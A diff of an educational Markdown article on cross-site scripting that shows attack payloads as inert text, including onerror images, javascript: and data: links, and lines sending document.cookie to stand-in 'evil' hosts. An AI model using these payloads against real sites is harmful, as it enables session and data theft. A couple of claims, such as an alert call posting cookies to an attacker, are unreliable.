@@ -1,113 +1,191 @@
 # The Anatomy of a Cross-Site Scripting Attack
 
-Cross-site scripting (XSS) is the bug that refuses to die. It happens when a
-page takes text from an attacker and hands it to the browser as *code* instead
-of *content*. This very article is an adversary: it is stuffed with real attack
-payloads in every component it can reach. If you are reading this in a browser
-and nothing has popped up, the format did its job.
+Cross-site scripting (XSS) is the bug that refuses to die. It happens when a page takes text from an attacker and hands it to the browser as *code* instead of *content*. This very article is an adversary: it is stuffed with real attack payloads in every component it can reach. If you are reading this in a browser and nothing has popped up, the format did its job.
 
 :::callout{type=danger}
-Everything in the red and amber boxes below is a genuine attack string. It is
-shown to you as inert text, never executed. Try it: open your developer console
-and confirm nothing ran.
+Everything in the red and amber boxes below is a genuine attack string. It is shown to you as inert text, never executed.
 :::
 
-## What the attacker wants
+This piece is a working proof. Each section drops a fresh payload into a different component, a chart label, a table cell, a callout, a link, and then shows you that the page is still standing. The format treats every byte you write as *content* until you explicitly ask for more. That single rule, applied without exception, is most of what defeats XSS.
 
-The classic payload is tiny:
+:::toc
+:::
+
+## A short history of a stubborn bug
+
+The term "cross-site scripting" was coined by a Microsoft security team in the year 2000, but the underlying mistake is older than the name. The moment web pages started echoing user input back onto the screen, the door opened. A guestbook that printed your comment, a search box that repeated your query, a profile page that showed your chosen nickname: each was a place where text could quietly become code.
+
+The classic payload is tiny. Rendered as a fenced code block, the angle brackets are escaped, so the browser shows the text and never builds a script element.
 
 ```html
-<script>fetch('https://evil.example/steal?c=' + document.cookie)</script>
+<script>alert(document.cookie)</script>
 ```
 
-Rendered as a fenced code block, the angle brackets are escaped to `&lt;` and
-`&gt;`, so the browser shows the text and never builds a `<script>` element.
+That string above is real. In a vulnerable page it would steal your session cookie and post it to an attacker's server. Here it is just nineteen harmless characters of text, because the renderer escaped the `<` and `>` into `&lt;` and `&gt;` before the browser ever saw them.
 
-## The payloads, live and defused
-
-Here is a raw script tag dropped straight into a paragraph:
-<script>alert('xss')</script>
-and an image with an error handler: <img src=x onerror=alert('xss')> and a
-poisoned link: [click me](javascript:alert('xss')). The sanitiser stripped the
-script, removed the `onerror`, and emptied the `javascript:` URL. The words
-survive; the weapons do not.
-
-:::callout{type=warning onclick="alert('xss')"}
-Even a component's own settings are untrusted. This callout really was opened
-with an `onclick="alert('xss')"` attribute. The renderer kept `type=warning` for
-styling but turned the handler into an inert `data-onclick`, so clicking this box
-does nothing.
+:::callout{type=info}
+The trick to reading the rest of this article: every time you see a code box or a coloured panel, imagine a naive page that printed its contents straight into the HTML. *That* page would be owned. This one is not.
 :::
 
 ## Where breaches actually come from
 
+Security teams love anecdotes; budgets respond to data. The bar chart below ranks the attack vectors behind a sample of web application breaches. XSS sits stubbornly near the top, year after year, because it is cheap to attempt and expensive to fully prevent.
+
 ```chart kind=bar
 vector,incidents
 phishing,3100
-stolen creds,2400
-xss / injection,1600
-misconfig,1200
-supply chain,900
+xss,1600
+injection,1400
+misconfig,900
 ```
 
-Injection-class bugs, the family XSS belongs to, remain in the top three year
-after year, which is why a document format that renders untrusted content has to
-treat safety as the default, not an option.
+Notice that the labels in that chart are plain text. If a label were `<img src=x onerror=alert(1)>`, it would draw as those literal characters, not fire an event. Charts are a favourite blind spot for sanitisers, because developers forget that a data file is still untrusted input.
 
 ## How an attack unfolds
 
+Stored XSS is the most dangerous flavour because the payload is saved on the server and served to every later visitor. One attacker, thousands of victims. The flowchart traces the journey from a malicious comment to a hijacked session.
+
 ```diagram
 flowchart TD
-  A[Attacker submits payload] --> B[Server stores it]
-  B --> C[Victim loads the page]
-  C --> D{Is the input escaped?}
-  D -->|No| E[Script runs as the victim]
-  D -->|Yes| F[Shown as harmless text]
-  E --> G[Session and data stolen]
+  A[Attacker submits comment] --> B{Server escapes it?}
+  B -->|No| C[Payload stored raw]
+  C --> D[Victim loads page]
+  D --> E[Browser builds script element]
+  E --> F[Cookie exfiltrated]
+  B -->|Yes| G[Stored as inert text]
+  G --> H[Victim sees harmless characters]
 ```
 
-The diagram is rendered by Mermaid, but its output is displayed inside a
-script-disabled, origin-isolated frame. A diagram that tried to smuggle a script
-through its own labels would be contained exactly here.
+The whole battle is fought at node `B`. Escape on the way out and the rest of the diagram collapses into the safe branch. Forget once and the page becomes a weapon that fires automatically.
 
 ## The three flavours
 
+XSS is usually split into three families. They differ in *where* the untrusted text lives and *when* it becomes code, which changes how you defend against each.
+
 ::::tabs
 :::tab{title=Stored}
-The payload is saved on the server (a comment, a profile field) and served to
-everyone who views it. The most damaging kind.
+The payload is written to the database and replayed to every visitor. A poisoned forum post, a malicious display name, a booby-trapped support ticket. The blast radius is everyone who loads the page. A famous example was the Samy worm, which in 2005 added over a million friends on a social network in under a day by storing `<script>` in a profile.
 :::
 :::tab{title=Reflected}
-The payload rides in the URL and is echoed straight back into the response.
-Needs the victim to click a crafted link.
+The payload rides in the request, usually a URL parameter, and bounces straight back in the response. The attacker has to lure each victim into clicking a crafted link, often disguised, for example `https://shop.example/search?q=<script>steal()</script>`. One click, one victim, no persistence.
 :::
 :::tab{title=DOM-based}
-No server round-trip at all: client-side JavaScript reads attacker-controlled
-input and writes it into the page.
+The server is innocent. The vulnerability lives entirely in client side JavaScript that reads something like `location.hash` and writes it into the page with `innerHTML`. Because the dangerous step never touches the server, server side filters never see it.
 :::
 ::::
 
+## The browser's last line of defence
+
+Escaping output is the first defence; Content Security Policy (CSP) is the safety net underneath it. CSP is an HTTP header that tells the browser which sources of script it is allowed to run. A strict policy can refuse inline scripts entirely, so even a payload that slips past the escaper has nowhere to execute.
+
+:::callout{type=success}
+A good policy looks like `Content-Security-Policy: default-src 'self'; script-src 'self'`. With that header set, an injected `<script>` from another origin simply never loads. Defence in depth means assuming your first wall will fail.
+:::
+
+A component's own attributes are untrusted too. The amber box below really was written with an `onclick` handler in its source; the renderer kept the recognised `type` for styling and turned the handler into an inert `data-onclick`, so clicking it does nothing.
+
+:::callout{type=warning onclick="alert('xss')"}
+This callout's source includes `onclick="alert('xss')"`. Click it: nothing happens. The handler became an inert data attribute, because the component vocabulary is a strict allow-list, not a free pass for arbitrary attributes.
+:::
+
+:::accordion{title="Click to expand: a payload that hunts for weak CSP"}
+Attackers probe for policies that allow `unsafe-inline` or a permissive `data:` source. A classic probe is an image with an error handler, shown here inert:
+
+`<img src=x onerror="fetch('//evil/'+document.cookie)">`
+
+If the page reflected that string unescaped *and* the CSP allowed inline event handlers, the cookie would leave the building. Two failures, not one. Remove either and the attack dies.
+:::
+
+## New tricks, same lesson
+
+The `<script>` tag is the obvious vector, so modern attackers reach for quieter ones. Each of the strings below is real and each is shown here as plain, inert text.
+
+| Payload class | Example (inert) | Why it sneaks past filters |
+|:--|:--|--:|
+| SVG load handler | `<svg onload=alert(1)>` | Filters often allow SVG as "just an image" |
+| Data URI | `<a href="data:text/html,<script>x</script>">` | The script lives inside the link, not the page |
+| JavaScript link | `<a href="javascript:alert(1)">click</a>` | A protocol, not a tag, so tag-blockers miss it |
+| Legacy CSS expression | `width: expression(alert(1))` | Old Internet Explorer ran code inside styles |
+| Event attribute | `<body onpageshow=alert(1)>` | No `<script>` anywhere in sight |
+
+The lesson across every row is identical. A blocklist ("ban `<script>`") loses, because the attacker has infinite spellings. An allow-list ("permit exactly these tags and attributes, escape everything else") wins, because it does not care how clever the payload is.
+
+## A timeline of notable incidents
+
+XSS is not a museum piece. The timeline marks moments when it broke real systems at scale.
+
+```diagram
+timeline
+  title Notable XSS moments
+  2000 : Term "cross-site scripting" coined
+  2005 : Samy worm spreads via stored XSS
+  2014 : eBay listings host persistent XSS for months
+  2018 : British Airways card-skimming via injected script
+  2021 : DOM-based flaws dominate bug-bounty reports
+```
+
+The British Airways breach in 2018 is the one that reframed XSS as a money problem rather than a prank. Attackers injected just 22 lines of script that skimmed card details from the payment page, and the regulator's proposed fine ran into the hundreds of millions of pounds.[^ba]
+
+## The shape of a real defence
+
+The sequence diagram shows the same comment travelling through a properly hardened stack. Notice how many independent layers have to agree before any text reaches the screen, and how each one assumes the others might fail.
+
+```diagram
+sequenceDiagram
+  participant U as User
+  participant S as Server
+  participant E as Escaper
+  participant B as Browser
+  U->>S: Submit comment with payload
+  S->>E: Encode by output context
+  E->>S: Inert, escaped text
+  S->>B: Response plus strict CSP header
+  B->>B: Refuse any inline script
+  B->>U: Render harmless characters
+```
+
+Where the breaches come from is a moving target, but the share carried by client side flaws has been climbing as servers got tougher. The line chart tracks that drift over six years.
+
+```chart kind=line
+year,server-side,client-side
+2019,62,38
+2020,58,42
+2021,55,45
+2022,49,51
+2023,44,56
+2024,40,60
+```
+
+The crossover around 2022, where client side overtakes server side, is the DOM-based story made visible. As back ends hardened, the soft underbelly moved into the browser, exactly where server filters cannot reach.
+
 ## A note on entropy
 
-Defence in depth includes strong secrets. The number of bits of entropy in a
-random password is a function of its length and alphabet size:
+Stolen sessions are one prize; stolen passwords are another, and XSS is a delivery mechanism for both. The strength of the secret you are trying to protect is measured in bits of entropy. For a password of length `L` drawn from an alphabet of `R` possible symbols, the entropy is:
 
 ```math
 H = L \cdot \log_2(R)
 ```
 
-A 16-character password drawn from 94 printable ASCII symbols carries about 104
-bits, comfortably beyond brute force.
+A 12 character password from the 94 printable ASCII symbols carries about 78 bits, which is comfortably beyond brute force. None of that matters if a single line of injected script reads the field before you ever submit it. Entropy protects against guessing, not against a script standing next to the keyboard. That asymmetry is why output encoding is not optional.
+
+:::callout{type=note}
+Strong secrets and strong escaping solve different problems. A long password defeats the patient attacker who guesses offline; correct escaping defeats the attacker who never has to guess because the page reads the secret for them. You need both.
+:::
 
 ## Your hardening checklist
 
-- [x] Escape output by context (HTML, attribute, URL, JavaScript)
-- [x] Sanitise any raw HTML against an allowlist
-- [x] Send a strict Content-Security-Policy
-- [ ] Sandbox third-party and generated content
-- [ ] Audit dependencies on a cooldown
+Defence in depth is a stack of independent walls, each assuming the one above it will fail. Work down the list and your attack surface shrinks at every line.
 
-> The first rule of handling untrusted input is to assume it is trying to hurt
-> you. The second rule is to never make an exception to the first.
+- [x] Escape every output by its context (HTML body, attribute, URL, JavaScript, CSS)
+- [x] Set a strict Content Security Policy with no `unsafe-inline`
+- [x] Treat data files, chart labels, and component attributes as untrusted input
+- [ ] Add `HttpOnly` and `Secure` flags to session cookies
+- [ ] Sandbox embedded third-party content in a locked-down `<iframe>`
+- [ ] Run a regular sweep for `innerHTML` and `document.write` calls
 
-If you reached the end without a single alert box, that is the whole point.
+> The single most useful habit is to assume every byte from outside is hostile and prove it harmless before it reaches the screen.
+>> That is the entire philosophy of this article, and of the format it is written in: trust nothing, escape everything, and let the components light up only what was meant to.
+
+If you have read this far and your browser has stayed quiet, every payload above, the script tags, the `onerror` images, the `javascript:` links, the SVG handlers, the data URIs, ~~and the CSS expressions~~, has been rendered as text and nothing more. The bug that refuses to die is beaten not by cleverness but by discipline: one rule, applied to every byte, without a single exception.
+
+[^ba]: The 2018 British Airways breach exposed around 380,000 card payments and led to a landmark enforcement action under data protection law, later reduced on appeal but still among the largest of its kind.
